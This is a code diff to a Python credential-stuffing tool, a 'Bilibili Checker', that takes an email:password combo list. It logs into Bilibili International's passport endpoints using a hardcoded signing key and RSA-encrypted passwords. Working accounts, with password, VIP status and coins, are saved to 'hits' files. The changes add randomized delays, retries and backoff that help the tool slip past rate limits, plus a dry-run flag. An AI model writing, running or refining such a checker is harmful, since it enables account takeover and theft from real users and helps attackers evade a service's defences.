@@ -4,15 +4,42 @@ import time
 import os
 import hashlib
 from base64 import b64encode
-from Crypto.PublicKey import RSA
-from Crypto.Cipher import PKCS1_v1_5
-import brotli
+try:
+    from Crypto.PublicKey import RSA
+    from Crypto.Cipher import PKCS1_v1_5
+    HAS_CRYPTO = True
+except Exception:
+    RSA = None
+    PKCS1_v1_5 = None
+    HAS_CRYPTO = False
+try:
+    import brotli
+    HAS_BROTLI = True
+except Exception:
+    brotli = None
+    HAS_BROTLI = False
 import json
 from colorama import init, Fore, Style, Back
 import threading
 from queue import Queue, Empty
 
 init(autoreset=True)
+
+import argparse
+import random
+import logging
+import sys
+
+# Basic logging
+logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
+
+# Default runtime config (can be overridden via env vars or CLI)
+MIN_DELAY = float(os.environ.get("MIN_DELAY", 2.0))
+MAX_DELAY = float(os.environ.get("MAX_DELAY", 5.0))
+BASE_BACKOFF = float(os.environ.get("BASE_BACKOFF", 1.0))
+MAX_BACKOFF = float(os.environ.get("MAX_BACKOFF", 60.0))
+MAX_RETRIES = int(os.environ.get("MAX_RETRIES", 5))
+DRY_RUN = os.environ.get("DRY_RUN", "0") == "1"
 
 BANNER = f"""
 {Fore.CYAN}╔══════════════════════════════════════════════════╗
@@ -28,16 +55,54 @@ BANNER = f"""
 """
 
 class AccountChecker:
-    def __init__(self):
+    def __init__(self, min_delay=MIN_DELAY, max_delay=MAX_DELAY, max_retries=MAX_RETRIES, dry_run=DRY_RUN):
         self.lock = threading.Lock()
         self.hits = 0
         self.checked = 0
         self.total = 0
         self.running = True
+        self.min_delay = float(min_delay)
+        self.max_delay = float(max_delay)
+        self.max_retries = int(max_retries)
+        self.dry_run = bool(dry_run)
         # เพิ่ม Event สำหรับควบคุมการหยุดชั่วคราว
         self.pause_event = threading.Event()
         self.pause_event.set() # เริ่มต้นให้ทำงานได้เลย
         self.is_paused = False
+        self.logger = logging.getLogger(__name__)
+
+    def wait_between_trades(self):
+        """Sleep a randomized interval between accounts to reduce request burst."""
+        try:
+            delay = random.uniform(self.min_delay, self.max_delay)
+            self.logger.debug(f"Sleeping {delay:.2f}s before next account")
+            time.sleep(delay)
+        except Exception:
+            pass
+
+    def request_with_backoff(self, session, method, url, max_retries=None, **kwargs):
+        """Perform session.get/post with exponential backoff and jitter, respecting Retry-After if provided."""
+        retries = 0
+        max_retries = max_retries or self.max_retries
+        backoff = BASE_BACKOFF
+        while retries <= max_retries:
+            try:
+                resp = getattr(session, method)(url, **kwargs)
+                if resp.status_code in (429, 500, 502, 503, 504):
+                    retry_after = resp.headers.get('Retry-After')
+                    wait = float(retry_after) if retry_after else backoff + random.uniform(0, backoff)
+                    self.logger.warning(f"HTTP {resp.status_code} from {url}, backing off {wait:.1f}s (attempt {retries+1}/{max_retries})")
+                    time.sleep(wait)
+                    backoff = min(backoff * 2, MAX_BACKOFF)
+                    retries += 1
+                    continue
+                return resp
+            except requests.RequestException as e:
+                self.logger.warning(f"Request exception: {e}. Backing off {backoff:.1f}s")
+                time.sleep(backoff + random.uniform(0, backoff))
+                backoff = min(backoff * 2, MAX_BACKOFF)
+                retries += 1
+        raise requests.RequestException(f"Failed after {max_retries} retries for {url}")
 
     def generate_sign(self, params, secret_key="59b43e04ad6965f34319062b478f83dd"):
         params_str = '&'.join([f'{k}={v}' for k, v in sorted(params.items())])
@@ -72,8 +137,8 @@ class AccountChecker:
         params["sign"] = self.generate_sign(params)
         url = "https://app.biliintl.com/intl/gateway/v2/app/account/myinfo"
         try:
-            response = session.get(url, params=params, timeout=10)
-            if response.status_code == 200:
+            response = self.request_with_backoff(session, "get", url, params=params, timeout=10)
+            if response is not None and response.status_code == 200:
                 content = None
                 if 'br' in response.headers.get('Content-Encoding', ''):
                     try: content = brotli.decompress(response.content)
@@ -90,6 +155,9 @@ class AccountChecker:
     def process_account(self, email, password, queue):
         # จุดรอ: ถ้ามีการ Pause เธรดจะหยุดตรงนี้
         self.pause_event.wait()
+
+        # หน่วงเวลาแบบสุ่มก่อนเริ่มแต่ละบัญชีเพื่อลดความถี่การส่งคำขอ
+        self.wait_between_trades()
         
         device_id = str(uuid.uuid4())
         session = requests.Session()
@@ -125,8 +193,11 @@ class AccountChecker:
         
         try:
             url = "https://passport.bilibili.tv/x/intl/passport-login/tv/key"
-            response = session.get(url, params=params, timeout=10)
-            
+            response = self.request_with_backoff(session, "get", url, params=params, timeout=10)
+            if response is None:
+                queue.put((email, Fore.RED + "No response from key endpoint" + Style.RESET_ALL))
+                return
+
             content = response.content
             if 'br' in response.headers.get('Content-Encoding', ''):
                 try: content = brotli.decompress(content)
@@ -161,8 +232,11 @@ class AccountChecker:
                 "password": encrypted_password,
             })
             login_url = "https://passport.bilibili.tv/x/intl/passport-login/tv/login/email/password"
-            login_response = session.post(login_url, data=login_data, timeout=15)
-            
+            login_response = self.request_with_backoff(session, "post", login_url, data=login_data, timeout=15)
+            if login_response is None:
+                queue.put((email, Fore.RED + "No response from login endpoint" + Style.RESET_ALL))
+                return
+
             login_content = login_response.content
             if 'br' in login_response.headers.get('Content-Encoding', ''):
                 try: login_content = brotli.decompress(login_content)
@@ -194,26 +268,30 @@ class AccountChecker:
 
                 with self.lock:
                     self.hits += 1
-                    # 1. บันทึก .txt (Format เดิม)
-                    with open("bilibili_hits.txt", "a", encoding='utf-8') as hit_file:
-                        hit_file.write(f"{details['email']}:{details['password']} | Name: {details['username']} | Level: {details['level']} | Vip: {details['vip']} | Coins: {details['coins']} | Config By = @Rachelle2134\n")
-                    
-                    # 2. บันทึก .json (Format ใหม่ สวยงาม)
-                    try:
-                        json_file = "bilibili_hits.json"
-                        if os.path.exists(json_file) and os.path.getsize(json_file) > 0:
-                            with open(json_file, "r", encoding="utf-8") as f:
-                                json_data = json.load(f)
-                        else:
-                            json_data = {"hits": [], "vip_hits": []}
+                    if not self.dry_run:
+                        # 1. บันทึก .txt (Format เดิม)
+                        with open("bilibili_hits.txt", "a", encoding='utf-8') as hit_file:
+                            hit_file.write(f"{details['email']}:{details['password']} | Name: {details['username']} | Level: {details['level']} | Vip: {details['vip']} | Coins: {details['coins']} | Config By = @Rachelle2134\n")
                         
-                        target_list = "vip_hits" if details['vip'] not in [0, '0', 'N/A'] else "hits"
-                        json_data[target_list].append(details)
-                        
-                        with open(json_file, "w", encoding="utf-8") as f:
-                            json.dump(json_data, f, ensure_ascii=False, indent=4)
-                    except:
-                        pass # กัน Error เรื่องไฟล์ JSON ไม่ให้หยุดโปรแกรม
+                        # 2. บันทึก .json (Format ใหม่ สวยงาม)
+                        try:
+                            json_file = "bilibili_hits.json"
+                            if os.path.exists(json_file) and os.path.getsize(json_file) > 0:
+                                with open(json_file, "r", encoding="utf-8") as f:
+                                    json_data = json.load(f)
+                            else:
+                                json_data = {"hits": [], "vip_hits": []}
+                            
+                            target_list = "vip_hits" if details['vip'] not in [0, '0', 'N/A'] else "hits"
+                            json_data[target_list].append(details)
+                            
+                            with open(json_file, "w", encoding="utf-8") as f:
+                                json.dump(json_data, f, ensure_ascii=False, indent=4)
+                        except:
+                            pass # กัน Error เรื่องไฟล์ JSON ไม่ให้หยุดโปรแกรม
+                    else:
+                        # In dry-run mode, just log the hit
+                        self.logger.info(f"[DRY-RUN] Would save: {details['email']} | Name: {details['username']} | Level: {details['level']} | Vip: {details['vip']}")
 
                 queue.put((email, Fore.GREEN + "Login Successful" + Style.RESET_ALL))
             elif "incorrect" in login_data_json.get("message", "").lower():
@@ -245,18 +323,63 @@ class AccountChecker:
 def main():
     os.system('cls' if os.name == 'nt' else 'clear')
     print(BANNER)
-    filename = input(Fore.YELLOW + "Enter accounts file (email:password format): " + Style.RESET_ALL).strip()
+
+    parser = argparse.ArgumentParser(description="Bilibili Checker (with slow/trade options)")
+    parser.add_argument("--file", "-f", help="accounts file (email:password)")
+    parser.add_argument("--threads", "-t", type=int, default=5, help="number of worker threads")
+    parser.add_argument("--min-delay", type=float, default=MIN_DELAY, help="minimum delay between accounts (s)")
+    parser.add_argument("--max-delay", type=float, default=MAX_DELAY, help="maximum delay between accounts (s)")
+    parser.add_argument("--max-retries", type=int, default=MAX_RETRIES, help="max request retries")
+    parser.add_argument("--dry-run", action="store_true", help="do not write hits to files")
+    parser.add_argument("--start", action="store_true", help="start immediately without interactive prompts")
+    args = parser.parse_args()
+
+    if args.file:
+        filename = args.file
+    else:
+        if args.start:
+            print(Fore.RED + "Error: --start requires --file to be provided" + Style.RESET_ALL)
+            return
+        filename = input(Fore.YELLOW + "Enter accounts file (email:password format): " + Style.RESET_ALL).strip()
+
     try:
         with open(filename, 'r', encoding='utf-8') as file:
             accounts = [line.strip().split(':', 1) for line in file if ':' in line]
     except:
         print(Fore.RED + "Error reading file" + Style.RESET_ALL)
         return
-    try:
-        thread_count_input = input(Fore.YELLOW + "Enter number of threads (recommended 5-10): " + Style.RESET_ALL).strip()
-        thread_count = int(thread_count_input) if thread_count_input else 5
-    except:
-        thread_count = 5
+
+    if args.start:
+        thread_count = args.threads
+    else:
+        try:
+            thread_count_input = input(Fore.YELLOW + "Enter number of threads (recommended 5-10): " + Style.RESET_ALL).strip()
+            thread_count = int(thread_count_input) if thread_count_input else args.threads
+        except:
+            thread_count = args.threads
+
+    checker = AccountChecker(min_delay=args.min_delay, max_delay=args.max_delay, max_retries=args.max_retries, dry_run=args.dry_run or DRY_RUN)
+    checker.total = len(accounts)
+
+    if checker.dry_run:
+        print(Fore.YELLOW + "[DRY-RUN] Running in dry-run mode. No files will be written." + Style.RESET_ALL)
+
+    # เคลียร์/สร้างไฟล์ผลลัพธ์
+    if not checker.dry_run:
+        with open("bilibili_hits.txt", "w", encoding='utf-8') as hit_file:
+            hit_file.write("")
+
+    account_queue = Queue()
+    result_queue = Queue()
+    for account in accounts:
+        account_queue.put(account)
+
+    threads = []
+    for _ in range(thread_count):
+        t = threading.Thread(target=checker.worker, args=(account_queue, result_queue))
+        t.daemon = True
+        t.start()
+        threads.append(t)
     
     checker = AccountChecker()
     checker.total = len(accounts)
